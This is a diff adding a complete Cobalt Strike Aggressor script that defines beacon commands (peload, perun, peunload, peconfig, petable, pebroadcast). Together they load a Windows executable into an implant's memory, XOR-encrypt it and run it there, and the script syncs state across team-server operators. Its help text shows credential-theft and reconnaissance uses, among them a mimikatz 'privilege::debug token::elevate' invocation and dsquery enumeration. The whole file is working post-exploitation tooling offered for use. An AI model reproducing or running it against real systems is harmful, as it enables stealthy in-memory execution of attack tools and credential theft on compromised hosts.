@@ -1,0 +1,845 @@
+global('@loadedPE $key $fillerarg $issuedcommand $petablefile')
+
+#Key used to XOR PE in memory
+$key = "redteam";
+
+#Filler argument used in place of "argv[0]". We have this so operator doesn't have to type the PE name before args, e.g. perun dsquery.exe, perun mimikatz.exe, etc
+#This can literally be gibberish, it's just a placeholder. 
+$fillerarg = "c:\\windows\\system32\\notepad.exe";
+
+#Boolean controlling whether this client should print to the Beacon console when receiving output relating to Inline-Execute-PE.
+#This exists so that if for example 4 clients are connnected to a TS, only the client that issued a Inline-Execute-PE command will react to and print messages rather than all 4 doing so.
+$issuedcommand = 0;
+
+#File path to external txt file where petable will be backed up after every modification and where client will try to load from on startup.
+$petablefile = cwd() . "/petable.txt";
+
+#@loadedPE is an array of arrays.  Each array in loadedPE follows this format and each value in the arrays is stored as a string:
+#@(BeaconID, PID, PEname, User, Date/Time, pMemAddrStruct, Timeout, UnloadLibraries, Aborted)
+#
+#Value description:
+#0.  beaconid = CobaltStrike internal identifier for each beacon.  Used to create/locate/remove entries in loadedPE when pe commands are issues from a beacon console.
+#1.  pid = Beacon process ID.  Stored for ease of reference for Operators. 
+#2.  PEname = Name of the PE that was loaded into the beacon process using peload.
+#3.  User = CobaltStrike user alias of the CS client that loaded the PE into beacon process
+#4.  Date/Time = Date and time that the PE was loaded into beacon
+#5.  pMemAddrStruct = Memory address of critical struct in beacon memory used by Inline-Execute-PE to track values across BOF's
+#6.  Timeout = Max number of seconds to wait for PE to finish executing.  When PE has ran longer than timeout it is forcibly terminated.
+#7.  UnloadLibraries = Boolean value dictating whether to try and unload DLL's that were loaded by the PE on runtime. Default TRUE.
+#8.  Aborted = Boolen value representing whether perun experienced timeout as set in the Timeout var. Default FALSE.
+#
+#$key variable is the string that Inline-Execute-PE will use to XOR encrypt the PE in memory.
+#
+
+
+############################## On load try to manually populate Inline-Execute-PE data structure from file ##############################
+
+#On initial load, check for/create file to store file upload data
+if(!-exists $petablefile)
+{
+    createNewFile($petablefile);
+
+    if (checkError($error))
+    {
+        show_error("Could not locate or create upload tracker file (specified as " . $petablefile . ")! Try manually creating this file and then re-load this CNA!")
+        exit();
+    }
+    else
+    {
+        println("Successfully located " . $petablefile . "!")
+    }
+}
+else
+{
+    #Read in uploads file to create array on startup
+    $handle = openf($petablefile);
+    while $text (readln($handle)) 
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted) = split(' ~\*~ ', $text);
+
+        #Add entry to petable
+        add(@loadedPE, @($bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted));
+    }
+    closef($handle);
+    println("Successfully located " . $petablefile . "!")
+}
+
+#This function called each time a clients PE table is modified in order to refresh the local on-disk copy of petable.
+sub writelogfile
+{
+    #open $petablefile file and write array out to file to ensure we don't lose data if CS crashes
+    $handle = openf(">" . $petablefile);
+    foreach @entry (@loadedPE)
+    {
+        println($handle, @entry[0] . " ~*~ " . @entry[1] . " ~*~ " . @entry[2] . " ~*~ " . @entry[3] . " ~*~ " . @entry[4] . " ~*~ " . @entry[5] . " ~*~ " . @entry[6] . " ~*~ " . @entry[7] . " ~*~ " . @entry[8]);
+    }
+    closef($handle);
+}
+
+#################################### Parse Beacon output and update Inline-Execute-PE data structure ####################################
+
+#Have to capture all beacon output and then filter to determine if it contains Inline-Execute-PE info or not
+on beacon_output
+{
+    local('$trash $x @entry')
+    
+    #Look for 'peload' in beacon_output, if it appears we need to parse and grab values
+    if("peload" isin $2)
+    {
+        $x = 0;
+
+        #Iterate over each array in @loadedPE
+        foreach @entry (@loadedPE)
+        {
+            #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+            if($1 eq @entry[0])
+            {
+                break;
+            }
+            $x++;
+        }
+
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash @loadedPE[$x][5]) = split(" ", split("\n", $2)[-1]);
+
+        #Announce in beacon console what we have done
+        if(@loadedPE[$x][5] eq "failure")
+        {
+            if($issuedcommand == 1)
+            {
+               berror($1, "\c4Failed to load PE! Clearing petable entry!\c4\n");             
+            }
+
+            #Remove entry from petable.
+            remove(@loadedPE, @loadedPE[$x]);
+        }
+        else
+        {
+            if($issuedcommand == 1)
+            {
+                blog($1, "\c9Successfully loaded PE!\c9\n");
+            }
+        }
+
+        #Set issuedcommand bool back to FALSE so we no longer print messages
+        $issuedcommand = 0;
+
+        #Re-write local petable file with updated data
+        writelogfile();
+    }
+    #Look for perun timeout, indicating that perun was aborted prematurely.  Have to mark this beacon as unable to load additional PE's now.
+    else if("perun timeout" isin $2)
+    {
+        $x = 0;
+
+        #Iterate over each array in @loadedPE
+        foreach @entry (@loadedPE)
+        {
+            #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+            if($1 eq @entry[0])
+            {
+                break;
+            }
+            $x++;
+        }
+
+        #Update entry with invisible "aborted" entry so we can alter display in petable and prevent loading of additional PE's.
+        @loadedPE[$x][8] = "TRUE";
+        if($issuedcommand == 1)
+        {
+            blog($1, "\c4PE exceeded timeout! PE thread aborted, run peunload to clear PE from memory.\c4");
+            blog($1, "\c8Additional PE's CANNOT be loaded into this beacon!\c8\n");
+        }
+
+        #Set issuedcommand bool back to FALSE so we no longer print messages
+        $issuedcommand = 0;
+
+        #Re-write local petable file with updated data
+        writelogfile();
+
+    }
+    #perun complete indicates a successful return from perun. This only exists so we can turn off the issuedcommand bool so we don't have multiple clients printing on subsequent output.
+    else if("perun complete" isin $2)
+    {
+        #Set issuedcommand bool back to FALSE so we no longer print messages
+        $issuedcommand = 0;
+    }
+    #perun successful means we have to update/remove entry from petable
+    else if("peunload successful" isin $2)
+    {
+        $x = 0;
+
+        #Iterate over each array in @loadedPE
+        foreach @entry (@loadedPE)
+        {
+            #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+            if($1 eq @entry[0])
+            {
+                break;
+            }
+            $x++;
+        }
+
+        #If Aborted == TRUE, clear some info but leave entry in table so that user's know they can't load another PE into this beacon.
+        if(@loadedPE[$x][8] eq "TRUE")
+        {
+            @loadedPE[$x][2] = "DISABLED!";
+            @loadedPE[$x][5] = "null";
+
+            if($issuedcommand == 1)
+            {
+                blog($1, "\c9Successfully unloaded PE from Beacon!\c9");
+                blog($1, "\c4Note: This beacon aborted during perun and will be unable to load another PE!\c4");
+            }
+        }
+        else
+        {
+            #Remove entire entry from petable.
+            remove(@loadedPE, @loadedPE[$x]);
+
+            if($issuedcommand == 1)
+            {
+                blog($1, "\c9Successfully unloaded PE from beacon!\c9\n");
+            }
+        }
+
+        #Set issuedcommand bool back to FALSE so we no longer print messages
+        $issuedcommand = 0;
+
+        #Re-write local petable file with updated data
+        writelogfile();
+    }
+}
+
+
+###################################### Parse Event Log and update Inline-Execute-PE data structure ######################################
+
+#Parse all events that hit the Event Log and act on those concerning Inline-Execute-PE events as well as notifications of new users joining the TS
+on event_action
+{
+    local('$trash $bid $pid $pe $user $datetime $structaddr $timeout $unloadlibraries $aborted $option $setting $x');
+    #If peload is in the event message, a new petable entry was created by a client and needs to be added to every other clients table.
+    if("peload" isin $2)
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted) = split(' ~\*~ ', $2);
+
+        #Add entry to petable
+        add(@loadedPE, @($bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted));
+
+        #Re-write local petable file with updated data
+        writelogfile();
+    }
+
+    #If peconfig is in the event message, we need to alter an existing petable entry.
+    else if("peconfig" isin $2)
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $bid, $option, $setting) = split(' ~\*~ ', $2);
+
+        $x = 0;
+        #Iterate over each array in @loadedPE
+        foreach @entry (@loadedPE)
+        {
+            #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+            if($bid eq @entry[0])
+            {
+                break;
+            }
+            $x++;
+        }
+
+        #Update the proper option (timeout/unloadlibraries)
+        if($option eq "timeout")
+        {
+            @loadedPE[$x][6] = $setting;
+        }
+        else #unloadlibraries
+        {
+            @loadedPE[$x][7] = $setting;
+        }
+
+        #Re-write local petable file with updated data
+        writelogfile();
+    }
+
+    #If pebroadcast is in event message and this client didn't send the broadcast, we need to sync our petable with the broadcasted one
+    else if("pebroadcast" isin $2 && $1 ne mynick())
+    {
+        #Now split beacon_output by space delimeter and assign values as appropriate
+        ($trash, $bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted) = split(' ~\*~ ', $2);
+
+        $x = 0;
+        $existingentry = 0;
+
+        #Iterate over each array in @loadedPE
+        foreach @entry (@loadedPE)
+        {
+            #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+            if($bid eq @entry[0])
+            {
+                $existingentry = 1;
+                break;
+            }
+            $x++;
+        }
+
+        #If we found an entry with the same $bid, update that entry
+        if($existingentry == 1)
+        {
+            @loadedPE[$x][1] = $pid;
+            @loadedPE[$x][2] = $pe;
+            @loadedPE[$x][3] = $user;
+            @loadedPE[$x][4] = $datetime;
+            @loadedPE[$x][5] = $structaddr;
+            @loadedPE[$x][6] = $timeout;
+            @loadedPE[$x][7] = $unloadlibraries;
+            @loadedPE[$x][8] = $aborted;
+        }
+        #Else we need to add a new row to petable for the entry we didn't have before.
+        else
+        {
+            #Add entry to petable
+            add(@loadedPE, @($bid, $pid, $pe, $user, $datetime, $structaddr, $timeout, $unloadlibraries, $aborted));
+        }
+
+        #Re-write local petable file with updated data
+        writelogfile();
+    }
+}
+
+#################################### Pass Inline-Execute-PE data structure to new users joining TS  #####################################
+
+on event_join
+{
+    #Query CS data model for users currently connected to TS, sort alphabetically
+    @users = sorta(data_query("users"));
+
+    #If this client is the first user (alphabetically), they will broadcast their petable so that all other clients may update / populate their tables.
+    if(@users[0] eq mynick())
+    {
+        #We are going to sleep for 5 seconds to allow the new CS client to fully startup + try and read from the local petable file (if it exists)
+        sleep(5000);
+
+        foreach @entry (@loadedPE)
+        {
+            action("pebroadcast" . " ~*~ " . @entry[0] . " ~*~ " . @entry[1] . " ~*~ " . @entry[2] . " ~*~ " . @entry[3] . " ~*~ " . @entry[4] . " ~*~ " . @entry[5] . " ~*~ " . @entry[6] . " ~*~ " . @entry[7] . " ~*~ " . @entry[8]);
+        }
+    }
+}
+
+################################################################ petable ################################################################
+
+alias petable
+{
+    local('@temparr');
+    #If 'petable clear' is issued, iterate through table and remove any entries for beacons that have exited or haven't called back in 3x their sleep time (assumed dead);
+    if($2 eq "clear")
+    {
+        foreach @entry (@loadedPE)
+        {
+            println(@entry);
+            $bid = @entry[0];
+            if( !-isactive $bid || binfo($bid, "last") >= (binfo($bid, "sleep")[0] * 1000 * 3))
+            {
+                #Have to build temporary array since we can't remove array items while iterating over that array
+                add(@temparr, @entry);
+            }
+        }
+
+        #Now remove each item in temparr from actual table
+        foreach @entry (@temparr)
+        {
+            remove(@loadedPE, @entry);
+        }
+    }
+
+    #Otherwise print table
+    else
+    {
+        $head1 = "PID";
+        $head2 = "PEname";
+        $head3 = "Loaded By";
+        $head4 = "Date/Time";
+        $head5 = "pMemAddrStruct";
+        $head6 = "Timeout";
+        $head7 = "UnloadLibraries";
+
+        blog($1, "");
+        blog($1, "\c9Green Entries\c9 = Active beacons");
+        blog($1, "\c4Red Entries = Active beacons that can no longer load a PE");
+        blog($1, "White Entries = Inactive beacons");
+        blog($1, "");
+        blog($1, "$[10]head1 $[30]head2 $[15]head3 $[15]head4 $[15]head5 $[15]head6 $[15]head7");
+        blog($1, "-" x 122);
+
+        foreach @entry (@loadedPE)
+        {
+            $bid = @entry[0];
+            $pid = @entry[1];
+            $PEname =  @entry[2]; #split("/", @entry[2], 50)[-1];
+            $user = @entry[3];
+            $datetime = @entry[4];
+            $pMemAddrStruct = @entry[5];
+            $timeout = @entry[6];
+            $bUnloadLibraries = @entry[7];
+
+            #Display still active beacons that have aborted a perun command as RED -> Cannot load another PE into them.
+            if( -isactive $bid && binfo($bid, "last") <= (binfo($bid, "sleep")[0] * 1000 * 3) && @entry[8] eq "TRUE")
+            {
+                blog($1, "\c4$[10]pid $[30]PEname $[15]user $[15]datetime $[15]pMemAddrStruct $[15]timeout $[15]bUnloadLibraries\c4");
+            }
+            #Display still active beacons as GREEN
+            else if(-isactive $bid && binfo($bid, "last") <= (binfo($bid, "sleep")[0] * 1000 * 3))
+            {
+                blog($1, "\c9$[10]pid $[30]PEname $[15]user $[15]datetime $[15]pMemAddrStruct $[15]timeout $[15]bUnloadLibraries\c9");
+            }
+            #Display inactive beacons and those that haven't called back within 3x the sleep time as normal/white.
+            else
+            {
+                blog($1, "$[10]pid $[30]PEname $[15]user $[15]datetime $[15]pMemAddrStruct $[15]timeout $[15]bUnloadLibraries");
+            }
+        }
+        blog($1, "");
+    }
+}
+
+beacon_command_register(
+    "petable", 
+    "View the table of currently loaded unmanaged Windows executables in Beacons", 
+    "
+Command: petable
+Summary: This command will display a table detailing all beacons in which a PE has been loaded.
+         The table may additionally be cleared of old entries concerning dead beacons.
+
+Usage:   petable <optional arg>
+         <optional arg>             Optional. 'clear' may be specified to clear entries from the table where Beacon is dead or has exceeded 3x callback time.
+
+         Example: petable                               <- This example will display the table of Beacons with loaded PE's.
+         Example: petable clear                         <- This example will clear the table of entries concerning Beacons that are either dead or who have exceeded 3x the callback time.
+"
+);
+
+################################################################ peload #################################################################
+
+alias peload
+{
+    local('$bid $barch $PE $args $x $matchfound');
+
+    $bid = $1;
+
+    if(1 > size(@_) || 2 < size(@_) )
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("peload"));
+        return;
+    }
+
+    $barch = barch($bid);
+    if($barch ne "x64")
+    {
+        berror($1, "Only x64 is supported... sorry");
+        return;
+    }
+
+    #Make sure user hasn't specified a key greater than 99 characters in length so we don't overflow var in BOF
+    if(strlen($key) > 99)
+    {
+        show_error("Inline-Execute-PE XOR key may not be longer than 99 characters! Edit Inline-Execute-PE.cna and reload!");
+        berror($1, "Inline-Execute-PE XOR key may not be longer than 99 characters! Edit Inline-Execute-PE.cna and reload!")
+        exit();
+    }
+
+    #Need to look at petable and see if there is already an entry for this beacon-> means there is already a mapped PE, don't let user map another
+    $x = 0;
+    $matchfound = 0;
+
+    #Iterate over each array in @loadedPE
+    foreach @entry (@loadedPE)
+    {
+        #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+        if($bid eq @entry[0])
+        {
+            $matchfound = 1;
+            break;
+        }
+        $x++;
+    }
+
+    if($matchfound == 1)
+    {
+        berror($bid, "This beacon already has a loaded PE: " . @loadedPE[$x][2]);
+        exit();
+    }
+    else if(!-exists $2)
+    {
+        berror($bid, "Specified executable does not exist!\n");
+        exit();
+    }
+    else
+    {
+        # read in the right BOF file
+        $handle = openf($2);
+        $PE   = readb($handle, -1);
+        closef($handle);
+
+        #Create array in @loadedPE to store PE data.
+        #Values: BeaconID, PID, PEname, User, Date/Time, pMemAddrStruct, Timeout, UnloadLibraries, Aborted
+        action("peload" . " ~*~ " . $bid . " ~*~ " . binfo($bid, "pid") . " ~*~ " . split("/", $2, 50)[-1] . " ~*~ " . mynick() . " ~*~ " . tstamp(ticks()) . " ~*~ " . "null" . " ~*~ " . "60" . " ~*~ " . "TRUE" . " ~*~ " . "FALSE");
+
+        #Set issuedcommand bool to TRUE so we print messages when we get feeback from BOF;
+        $issuedcommand = 1;
+
+        loadpe($bid, $PE);
+    }
+}
+
+sub loadpe{ 
+    #Figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("peload. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($1, "bz", $2, $key);
+
+    # Execute BOF
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "peload",
+    "Load an unmanaged Windows executable into Beacon memory",
+    "
+Command: peload
+Summary: This command will run a BOF to load an unmanaged PE into Beacon memory.
+         Supports x64 C or C++ binaries compiled with mingw or visual studio.  Binaries outside these parameters are untested. 
+
+Usage:   peload </path/to/binary.exe>
+         </path/to/binary.exe>        Required. Full path to the windows EXE you wish you load into the Beacon.
+
+         Example: peload /root/windows_binaries/dsquery_win7.exe
+"
+);
+
+################################################################# perun #################################################################
+
+alias perun
+{
+    local('$cmdline $args $pMemAddrStruct $x $matchfound $timeout %params @keys');
+
+    $bid = $1;
+
+    #Need to look at petable and make sure there is a mapped PE in this beacon, else exit and inform user they need to map one
+    $x = 0;
+    $matchfound = 0;
+
+    #Iterate over each array in @loadedPE
+    foreach @entry (@loadedPE)
+    {
+        #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+        if($bid eq @entry[0])
+        {
+            $matchfound = 1;
+            break;
+        }
+        $x++;
+    }
+
+    if($matchfound == 0)
+    {
+        berror($bid, "There is not a PE mapped in this beacon!");
+        exit();
+    }
+    else if(@loadedPE[$x][8] eq "TRUE")
+    {
+        berror($bid, "This Beacon cannot run a PE because the timeout condition was reached!");
+        exit();
+    }
+    else
+    {
+        $pMemAddrStruct = @loadedPE[$x][5];
+        $cmdline = $fillerarg;
+        $timeout = @loadedPE[$x][6];
+
+        $y = 0;
+        #Iterate through args given to perun
+        foreach $arg (@_)
+        {
+            #Discard the first arg; this is always the beacon ID which we don't need. Otherwise build final cmdline string by concatenating args. 
+            if($arg ne @_[0])
+            {
+                #We have instructed users to 'escape' double quotes by using a backslash; identify this and replace with a normal double quote.
+                $arg = strrep($arg, '\\"', '"');
+                println("arg " . $y . " is: " . $arg . "\n"); 
+                $cmdline = $cmdline .  " " . $arg;
+            }
+            $y++;
+        }
+
+        #Set issuedcommand bool to TRUE so we print messages when we get feeback from BOF;
+        $issuedcommand = 1;
+
+        runpe($1, $pMemAddrStruct, $cmdline, $timeout);
+    }
+}
+
+sub runpe{
+    #Figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("perun. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "zzzi", $key, $2, $3, $4);
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "perun",
+    "Execute an unmanaged Windows executable in Beacon memory",
+    "
+Command: perun
+Summary: This command will run a BOF to execute an unmanaged PE that was previously loaded using the peload command.
+         Provide any command line arguments to the PE immediately following perun.
+         Any double quotes (\") in the command line arguments must be escaped using the backslash (\) character.
+
+Usage:   perun <arg> <arg> <arg> ...
+         <arg>        An argument to the loaded PE.  Do not specify the name of the executable, this is covered by the \"fillerarg\" variable in the aggressor script.
+
+         Example: perun privilege::debug token::elevate exit                <- This example when mimikatz.exe was loaded using peload
+         Example: perun * -filter \"(objectclass=user)\" -attr * -Limit 1     <- This example when dsquery.exe was loaded using peload. Notice backslash to escape double quotes.
+         Example: perun /c cd                                               <- This example when cmd.exe was loaded using peload.
+         Example: perun -acceptula -p explorer.exe                          <- This example when handle64.exe (sysinternals) was loaded using peload.
+         Example: perun Get-MpPreference                                    <- This example when powershell.exe was loaded using peload.
+"
+);
+
+################################################################ peunload ###############################################################
+
+alias peunload
+{
+    local('$args $pMemAddrStruct $x $bUnloadLibraries');
+
+    $bid = $1;
+
+    if( size(@_) > 1)
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("peunload"));
+        exit();
+    }
+
+    if(!-isactive $bid || binfo($bid, "last") >= (binfo($bid, "sleep")[0] * 1000 * 3))
+    {
+        berror($1, "Cannot unload PE from a Beacon that is not alive or has not called back within 3x the set sleep time!");
+        exit();
+    }
+
+    #Need to look at petable and make sure there is a mapped PE in this beacon, else exit and inform user they need to map one
+    $x = 0;
+    $matchfound = 0;
+
+    #Iterate over each array in @loadedPE
+    foreach @entry (@loadedPE)
+    {
+        #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+        if($bid eq @entry[0])
+        {
+            $matchfound = 1;
+            break;
+        }
+        $x++;
+    }
+
+    if($matchfound == 0)
+    {
+        berror($bid, "There is not a PE mapped in this beacon!");
+        exit();
+    }
+    else if(@loadedPE[$x][2] eq "DISABLED!")
+    {
+        berror($bid, "There is not a PE mapped in this beacon!");
+        exit();
+    }
+    else
+    {
+        #Translate bUnloadLibraries in table to numerical representation
+        if(@loadedPE[$x][7] eq "TRUE")
+        {
+            $bUnloadLibraries = 1;
+        }
+        else
+        {
+            $bUnloadLibraries = 0;
+        }
+        
+        $pMemAddrStruct = @loadedPE[$x][5];
+
+        #Set issuedcommand bool to TRUE so we print messages when we get feeback from BOF;
+        $issuedcommand = 1;
+
+        unloadpe($bid, $pMemAddrStruct, $bUnloadLibraries);
+    }
+
+
+}
+
+sub unloadpe{
+    #Figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("peunload. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "zi", $2, $3);
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "peunload",
+    "Unload an unmanaged Windows executable from Beacon memory",
+    "
+Command: peunload
+Summary: This command will run a BOF to unload an unmanaged PE from Beacon memory and cleanup additional structures.
+         Memory containing the PE will be zeroed out and freed.
+         (most) handles and file pointers opened as part of Inline-Execute-PE will be closed.
+         Will attempt to unload DLL's loaded by the PE unless otherwise specified by peconfig.
+
+Usage:   peunload
+"
+);
+
+############################################################### peconfig ################################################################
+
+alias peconfig
+{
+    local('$x @entry $bid');
+
+    $bid = $1;
+
+    if(!-isactive $bid || binfo($bid, "last") >= (binfo($bid, "sleep")[0] * 1000 * 3))
+    {
+        berror($1, "Cannot update settings for a Beacon that is not alive or has not called back within 3x the set sleep time!");
+        exit();
+    }
+
+    $x = 0;
+
+    #Iterate over each array in @loadedPE
+    foreach @entry (@loadedPE)
+    {
+        #Check if bid matches first entry in the array; if so, this array is the one we want to alter data in. 
+        if($bid eq @entry[0])
+        {
+            break;
+        }
+        $x++;
+    }
+
+    #Verify setting user wishes to alter
+    if(lc($2) eq "timeout")
+    {
+        if($3 ismatch '\d+')
+        {
+            #Write to Event Log so all clients can update petable entry
+            action("peconfig" . " ~*~ " . $bid . " ~*~ " . $2 . " ~*~ " . $3);
+        }
+        else
+        {
+            berror($1, "Incorrect usage!");
+		    berror($1, beacon_command_detail("peconfig"));
+            exit();
+        }
+
+    }
+    else if(lc($2) eq "unloadlibraries")
+    {
+        if(lc($3) eq "true" || lc($3) eq "false")
+        {
+            #Write to Event Log so all clients can update petable entry
+            action("peconfig" . " ~*~ " . $bid . " ~*~ " . $2 . " ~*~ " . uc($3));
+        }
+        else
+        {
+            berror($1, "Incorrect usage!");
+		    berror($1, beacon_command_detail("peconfig"));
+            exit();
+        }
+    }
+    else
+    {
+        berror($bid, "Invalid setting");
+        berror($bid, beacon_command_detail("peconfig"));
+        exit();
+    }
+}
+
+beacon_command_register(
+    "peconfig",
+    "Configure options for unmanaged Windows executables loaded in Beacon memory",
+    "
+Command: peconfig
+Summary: This command alters options relating to a PE loaded in Beacon memory.
+         These settings are on a per-PE basis; if you unload one PE from a Beacon and then load another, settings will revert to their defaults. 
+         Two options may be altered using this command: timeout and unloadlibraries
+
+         timeout:           This option controls how long Beacon will wait for the PE to finish running before forcibly terminating it.
+                            This limiter exists as a fail-safe for PE's which may have been given arguments that cause them to run infinitely (e.g. a mimikatz command that didn't include 'exit')
+                            Note that if a PE is aborted by the timeout feature, this Beacon will lose the ability to load and use additional PE's!
+
+         unloadlibraries:   This option dictates whether or not peunload will attempt to unload DLL's that were loaded by the PE during runtime. Default setting is TRUE.
+                            Sometimes Beacon will crash after DLL's that were loaded by a PE are unloaded; one such example is when a PE loads the .NET CLR (e.g. Powershell)
+                            This setting can be set to FALSE so that any DLL's loaded by a PE will be left in the process.
+
+Usage:   peconfig <option> <value>
+         <option>        Required.    The option you wish to alter.
+                                      Acceptable values:
+                                        timeout
+                                        unloadlibraries
+
+
+         <value>         Required.    The setting you wish to assign to the specific option.
+                                      timeout:           The number of seconds you wish to wait for the PE to complete running. Default 60 seconds.
+                                      unloadlibraries:  Whether or not to try and unload DLL's loaded by the PE. Default TRUE.
+
+
+        Example: peconfig timeout 180                                       <- This example sets the timeout to 3 minutes.  Set timeout longer when long-running PE's are being used.
+        Example: peconfig unloadlibraries FALSE                             <- This example instructs peunload to not try to unload DLL's loaded by the PE. Useful with specific PE's that otherwise cause crashes when this is attempted.
+"
+);
+
+############################################################## pebroadcast ##############################################################
+
+alias pebroadcast
+{
+    foreach @entry (@loadedPE)
+    {
+        action("pebroadcast" . " ~*~ " . @entry[0] . " ~*~ " . @entry[1] . " ~*~ " . @entry[2] . " ~*~ " . @entry[3] . " ~*~ " . @entry[4] . " ~*~ " . @entry[5] . " ~*~ " . @entry[6] . " ~*~ " . @entry[7] . " ~*~ " . @entry[8]);
+    }
+}
+
+beacon_command_register(
+    "pebroadcast",
+    "Manually broadcast Client's data concerning unmanaged Windows executables loaded in Beacon memory to all other CobaltStrike Clients.",
+    "
+Command: pebroadcast
+Summary: This command will broadcast the Client's petable to all other connected Clients, causing them to update their table with the data contained in the broadcasting Clients' petable.
+
+Usage:   pebroadcast
+"
+);
